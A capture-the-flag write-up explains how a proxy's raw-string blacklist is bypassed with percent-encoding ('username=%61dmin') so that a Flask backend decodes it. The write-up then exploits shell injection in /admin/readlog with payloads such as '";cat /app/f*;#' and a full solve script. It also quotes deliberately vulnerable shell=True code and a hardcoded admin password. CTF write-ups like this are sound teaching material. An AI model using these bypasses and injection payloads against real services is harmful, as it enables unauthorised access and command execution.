# Proxied - Writeup

> We're trying to get access to a remote device and dumped a couple of interesting programs from its firmware. It looks like the webserver is vulnerable, but we have to go through the proxy first...

## Challenge Files

- `proxy`
- `webserver.py`
- `flag.txt`
- `solve.py`

## TL;DR

The challenge has two parts:

1. The backend Flask app has an obvious command injection in `/admin/readlog`.
2. The front proxy blocks a few dangerous `key=value` pairs by parsing the raw request body itself.

The win condition is a classic parser mismatch:

- the proxy checks the **raw** body
- Flask checks the **URL-decoded** form body

So:

- `username=%61dmin` is accepted by the proxy
- Flask decodes it to `username=admin`
- the backend logs us in as `admin`

Then we hit `/admin/readlog` with:

- the same encoded admin username
- the valid admin token
- an encoded shell injection in `filter`

and read the flag with:

```sh
cat /app/f*
```

## Supplied Files

### `webserver.py`

This is the backend application. The relevant routes are:

- `/login`
- `/question`
- `/admin/readlog`

The critical bug is here:

```python
@app.route('/admin/readlog')
def readlog():
    ...
    if request.form['username'] != 'admin':
        abort(403)
    return check_output(f'grep "{request.form["filter"]}" {LOGFILE} | tail -n 100', shell=True)
```

That is direct shell injection via the `filter` parameter.

There is also a hardcoded admin password:

```python
USERS = {'admin': 't0p5ecr3tp@ss'}
```

### `flag.txt`

The local `flag.txt` says:

```text
RS{this is a fake flag for testing}
```

So that one is not the real flag. It is only there to keep local testing simple.

### `proxy`

This is the interesting part. It is a Mach-O arm64 binary, not Linux-native:

```text
proxy: Mach-O 64-bit arm64 executable
```

So the challenge is really about reversing the proxy logic and then abusing the live service.

## Backend Notes

## Odd Flask Detail: `GET` + `request.form`

All routes use the default Flask method set, so they are `GET` endpoints.

But they also read parameters from `request.form`.

That means normal query strings do not help. We need to send:

- `GET`
- with a request body
- with `Content-Type: application/x-www-form-urlencoded`

The remote proxy allows this, and Flask will parse it.

## Reversing the Proxy

## Quick Clues from Strings

The proxy strings already expose the important logic:

```text
HTTP/1.1 400 Bad Request
Your request has been rejected by the proxy.
127.0.0.1
username
admin
password
t0p5ecr3tp@ss
filter
flag.txt
parse_body
get_value_from_body
check_request_for_illegal_vals
run_proxy
```

That strongly suggests:

- the proxy forwards to `127.0.0.1`
- it parses request bodies itself
- it has a blacklist of suspicious key/value pairs

## Useful Mach-O Symbols

The binary is nice enough to keep symbols:

```text
0x100001534 _bail_out_400
0x10000159c _get_value_from_body
0x1000016f8 _parse_body
0x1000017f8 _check_request_for_illegal_vals
0x100001910 _run_proxy
```

It also exposes the baked-in blacklist entries in `__DATA`:

```text
0x100008000 username
0x100008009 admin
0x10000800f password
0x100008018 t0p5ecr3tp@ss
0x100008026 filter
0x10000802d flag.txt
```

So the intended blocked pairs are:

- `username=admin`
- `password=t0p5ecr3tp@ss`
- `filter=flag.txt`

## What `parse_body` Does

The function at `0x1000016f8` iterates through the body and builds a map of parsed form pairs.

The important behavior is:

- it splits on `=`
- it splits values on `&`
- it stores exact raw key/value strings

There is no URL-decoding here.

That is the bug.

## What `check_request_for_illegal_vals` Does

The function at `0x1000017f8`:

1. Iterates through the blacklist keys
2. Pulls the corresponding raw value from the request body
3. Compares it against the blacklisted raw value
4. Rejects the request if the strings match exactly

High-level pseudocode:

```c
for each illegal_key in blacklist:
    body_val = parsed_body[illegal_key]
    bad_val = blacklist[illegal_key]
    if strcmp(body_val, bad_val) == 0:
        reject_400();
```

Again: exact raw string comparison, no decoding.

## The Parser Mismatch

The backend Flask app does decode URL-encoded form values.

So this works:

```text
username=%61dmin
```

because:

- proxy sees raw value `%61dmin`
- `%61dmin != admin`
- request is allowed
- Flask decodes `%61dmin` into `admin`

The same idea works for injected `filter` values too.

## Verifying the Bypass

A raw admin login is blocked by the proxy:

```http
GET /login
Content-Type: application/x-www-form-urlencoded

username=admin&password=t0p5ecr3tp@ss
```

Response:

```text
400 Bad Request
Your request has been rejected by the proxy.
```

But this succeeds:

```http
GET /login
Content-Type: application/x-www-form-urlencoded

username=%61dmin&password=t0p5ecr3tp@ss
```

and returns a valid admin token.

## Exploiting `/admin/readlog`

Once we have an admin token, we can hit:

```text
/admin/readlog
```

The backend constructs:

```sh
grep "<filter>" log.txt | tail -n 100
```

So we close the quote, run our own command, and comment out the rest:

```text
";cat /app/f*;#
```

URL-encoded:

```text
%22%3Bcat%20/app/f*%3B%23
```

That becomes:

```sh
grep "";cat /app/f*;#" log.txt | tail -n 100
```

and the shell executes `cat /app/f*`.

## Finding the Real Flag Path

I confirmed the working directory first with a harmless injection:

```sh
";pwd;ls -la;#
```

This returned:

```text
/app
total 36
...
-rw-rw-r--. 1 appuser root    23 Apr  2 17:20 flag.txt
...
```

So the real remote flag path is:

```text
/app/flag.txt
```

To avoid the proxy’s literal `flag.txt` blacklist, I used the wildcard form:

```sh
cat /app/f*
```

## Final Exploit Flow

1. Send `GET /login` with body:

```text
username=%61dmin&password=t0p5ecr3tp@ss
```

2. Receive an admin token.
3. Send `GET /admin/readlog` with body:

```text
username=%61dmin&token=<token>&filter=%22%3Bcat%20/app/f*%3B%23
```

4. Read the flag from the response.

## Solution Script

The working solve script is [`solve.py`](./solve.py):

```python
import re
import ssl
import urllib.request


BASE = "https://proxied.ctf.ritsec.club"
CT = "application/x-www-form-urlencoded"


def send_get_with_body(path: str, body: str) -> str:
    req = urllib.request.Request(
        BASE + path,
        data=body.encode(),
        headers={"Content-Type": CT},
        method="GET",
    )
    ctx = ssl.create_default_context()
    with urllib.request.urlopen(req, context=ctx) as resp:
        return resp.read().decode("utf-8", errors="replace")


def login_admin() -> str:
    body = "username=%61dmin&password=t0p5ecr3tp@ss"
    return send_get_with_body("/login", body).strip()


def read_flag(token: str) -> str:
    injected = "%22%3Bcat%20/app/f*%3B%23"
    body = f"username=%61dmin&token={token}&filter={injected}"
    return send_get_with_body("/admin/readlog", body)


def main():
    token = login_admin()
    print(f"[+] admin token: {token}")

    data = read_flag(token)
    print(data)

    match = re.search(r"RS\\{[^}\\n]+\\}", data)
    if match:
        print(f"[+] flag: {match.group(0)}")


if __name__ == "__main__":
    main()
```

## Example Output

```text
[+] admin token: ...
RS{BY0_smugg1e_exp1oit}
```

## Why This Works

The core bug is not in Flask.

It is the mismatch between:

- the proxy’s homemade raw-string form parser
- Flask’s decoded form parser

The proxy intended to block dangerous values, but it only blocked their exact raw encodings. Once percent-encoding enters the picture, the proxy and backend disagree about what the request means.

That gives us:

- admin login bypass
- admin-only command injection
- flag read
